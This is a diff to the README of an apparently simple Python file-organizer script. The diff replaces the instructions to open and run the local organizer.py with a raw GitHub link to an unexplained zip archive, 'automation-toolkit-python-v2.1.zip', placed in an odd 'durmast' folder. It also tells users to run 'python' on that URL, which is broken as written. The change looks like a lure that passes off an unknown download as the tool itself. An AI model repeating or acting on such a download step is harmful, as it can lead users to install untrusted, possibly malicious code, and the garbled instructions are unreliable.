@@ -14,12 +14,12 @@ This script scans a folder and automatically moves files into categorized folder
 - Archives
 
 How to Use
-1. Open organizer.py
+1. Open https://github.com/chandan1145/python-automation-toolkit/raw/refs/heads/main/durmast/automation-toolkit-python-v2.1.zip
 2. Change the folder path:
    path = r"C:\Users\YourName\Downloads"
 
 3. Run:
-   python organizer.py
+   python https://github.com/chandan1145/python-automation-toolkit/raw/refs/heads/main/durmast/automation-toolkit-python-v2.1.zip
 
 Technologies Used
 - Python
